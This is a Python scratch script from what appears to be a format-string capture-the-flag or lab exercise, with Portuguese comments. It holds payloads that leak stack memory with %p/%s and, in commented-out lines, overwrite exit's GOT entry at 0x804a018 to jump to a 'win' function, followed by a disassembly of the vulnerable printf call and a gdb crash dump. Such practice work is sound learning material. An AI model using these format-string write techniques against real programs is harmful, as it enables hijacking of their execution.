# print("\x18\xa0\x04\x08" + 
#         "\x19\xa0\x04\x08" +
#         "\x20\xa0\x04\x08" +
#         "\x21\xa0\x04\x08" +
#         "%139x%7$n"+
#         "%184x%8$n"+
#         "%128x%9$n"+
#         "%4x%10$n"
#     )

#print("\x19\xa0\x04\x08" + "%131x" + "%7$n") #esta a dar segfault antes de fazer o print :skull:
#print("AAAA" +"%080x."*20) #esta a dar segfault antes de fazer o print :skull:
#print("\x18\xa0\x04\x08"+ "AAAABBBBCCCC" + "%7$n"*4) #esta a dar segfault antes de fazer o print :skull:

#buf = ''
#buf += 'AAAA'
#buf += '|%p'*7
#print(buf)
import struct

buf = ''
buf += str(struct.pack('I', 0x80485d0))
buf += '|%p'*6
buf += '|%s'
buf += '|%p'*5

print(buf)
# 0x804a018 exit
# 0x804849b win
# b* 0x0804850d
# b* 0x0804851a

"""
Dump of assembler code for function vuln:
   0x080484c4 <+0>:	push   ebp
   0x080484c5 <+1>:	mov    ebp,esp
   0x080484c7 <+3>:	push   edi
   0x080484c8 <+4>:	sub    esp,0x94
   0x080484ce <+10>:	mov    eax,gs:0x14
   0x080484d4 <+16>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484d7 <+19>:	xor    eax,eax
   0x080484d9 <+21>:	lea    edx,[ebp-0x8c]
   0x080484df <+27>:	mov    eax,0x0
   0x080484e4 <+32>:	mov    ecx,0x20
   0x080484e9 <+37>:	mov    edi,edx
   0x080484eb <+39>:	rep stos DWORD PTR es:[edi],eax
   0x080484ed <+41>:	sub    esp,0x4
   0x080484f0 <+44>:	push   0x7f
   0x080484f2 <+46>:	lea    eax,[ebp-0x8c]
   0x080484f8 <+52>:	push   eax
   0x080484f9 <+53>:	push   0x0
   0x080484fb <+55>:	call   0x8048340 <read@plt>
   0x08048500 <+60>:	add    esp,0x10
   0x08048503 <+63>:	sub    esp,0xc
   0x08048506 <+66>:	lea    eax,[ebp-0x8c]
   0x0804850c <+72>:	push   eax
   0x0804850d <+73>:	call   0x8048350 <printf@plt>
   0x08048512 <+78>:	add    esp,0x10
   0x08048515 <+81>:	sub    esp,0xc
   0x08048518 <+84>:	push   0x0
   0x0804851a <+86>:	call   0x8048370 <exit@plt>
   
   
   
   [----------------------------------registers-----------------------------------]
EAX: 0x4a0c218 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0xffffc040 --> 0xffffffff 
EDI: 0x5 
EBP: 0xffffc888 --> 0xf7ddedd9 (test   bl,bl)
ESP: 0xffffbfa0 --> 0x0 
EIP: 0xf7dde657 (mov    DWORD PTR [eax],edi)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7dde64c:	test   edx,edx
   0xf7dde64e:	jne    0xf7dde8d1
   0xf7dde654:	mov    edi,DWORD PTR [ebp+0x10]
=> 0xf7dde657:	mov    DWORD PTR [eax],edi
   0xf7dde659:	jmp    0xf7ddd86d
   0xf7dde65e:	mov    ecx,DWORD PTR [ebp-0x8d4]
   0xf7dde664:	test   ecx,ecx
   0xf7dde666:	jne    0xf7dde8dd
[------------------------------------stack-------------------------------------]
0000| 0xffffbfa0 --> 0x0 
0004| 0xffffbfa4 --> 0x0 
0008| 0xffffbfa8 --> 0x0 
0012| 0xffffbfac --> 0x0 
0016| 0xffffbfb0 --> 0x0 
0020| 0xffffbfb4 --> 0x0 
0024| 0xffffbfb8 --> 0xf7f302c0 --> 0x4000001 
0028| 0xffffbfbc --> 0xffffcd9c --> 0x4f483e00 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xf7dde657 in ?? () from /lib/i386-linux-gnu/libc.so.6

"""